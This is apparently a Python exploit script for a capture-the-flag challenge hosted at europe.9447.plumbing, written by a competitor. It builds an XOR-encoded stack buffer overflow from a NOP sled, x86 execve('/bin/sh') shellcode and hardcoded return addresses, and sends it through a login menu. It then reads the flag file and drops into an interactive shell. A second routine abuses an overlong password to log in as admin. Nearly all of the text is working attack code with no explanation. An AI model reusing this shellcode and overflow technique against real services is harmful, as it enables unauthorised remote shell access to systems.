__author__ = 'HuyNA'


import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop
'''
IP: europe.9447.plumbing
Port: 9447
'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "europe.9447.plumbing"
local_host="192.168.248.135"
port = 9447
s.connect((host, port))
#s.connect((local_host, port))

'''
    socat TCP-LISTEN:9447,reuseaddr,fork EXEC:./europe03-fix
'''

def exploit_flag03(s):
    #print recv_until(s,'> ')

    def login_option(s, username, passwd):
        s.send('1\n')
        print recv_until(s, 'Username: ')
        s.send(username+'\n')
        time.sleep(0.001)
        print recv_until(s, 'Password: ')
        s.send(passwd+'\n')

    def print_message_option(s):
        s.send('3\n')
    def exit_(s):
        s.send('4\n')
        print '4\n'
    shellcode = '\x31\xD2\x31\xF6\x31\xFF\x31\xC0\x31\xC9\xB0\x0B\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x51\x89\xE2\x53\x89\xE1\xCD\x80'

    shellcode = '\x90'*128+shellcode
    shellcode1 = shellcode*6

    size_to_return = 0x5E0

    # .text:08048E55 61C 8D 85 07 FA FF FF                       lea     eax, [ebp-5F9h] ;
    return_address = 0x0804B560
    return_address2 = 0x0804A1C0
    rop = [
        return_address,
        return_address
    ]
    rop=convert_format(rop)
    username = shellcode1 + 'a'*(size_to_return-len(shellcode1))+'\xe0\x05\x00\x00'+rop*8+shellcode
    username = xor_encrypt(username, '\x20')
    passwd = shellcode1


    print recv_until(s,'> ')
    login_option(s, 'guest', 'guest')

    print recv_until(s,'> ')
    login_option(s, username, passwd)

    print recv_until(s,'> ')
    login_option(s, 'guest', 'guest')

    print recv_until(s,'> ')
    login_option(s, username, passwd)

    print recv_until(s,'> ')
    login_option(s, username, passwd)

    #oveflow stack
    time.sleep(1)
    print recv_until(s,'> ')
    print_message_option(s)

    # exit to run overflow code
    print recv_until(s,'> ')
    exit_(s)

    s.send('ls\ncat flag03\n')
    print s.recv(1024)
    s.send('ls\ncat flag03\n')
    print s.recv(1024)
    s.send('ls\ncat flag03\n')
    print s.recv(1024)
    s.send('ls\ncat flag03\n')
    print s.recv(1024)

    final_interact(s)
    # 9447{c0n6rat5_oN_Conquer1ng_Europ3}
#raw_input(1)
exploit_flag03(s)

def exploit_flag01(s):
    def login_option(s, username, passwd):
        s.send('1\n')
        print recv_until(s, 'Username: ')
        s.send(username+'\n')
        time.sleep(0.001)
        print recv_until(s, 'Password: ')
        s.send(passwd+'\n')

    def print_message_option(s):
        s.send('3\n')

    def print_read_key(s):
        s.send('2\n')


    username = 'admin'
    passwd = 'a'*500
    print recv_until(s,'> ')
    login_option(s, 'guest', 'guest')
    print recv_until(s,'> ')
    login_option(s, 'guest', 'guest')
    print recv_until(s,'> ')
    login_option(s, 'guest', 'guest')
    print recv_until(s,'> ')
    login_option(s, username, passwd)
    print recv_until(s,'> ')
    print_read_key(s)
    print recv_until(s,'> ')

#exploit_flag01(s)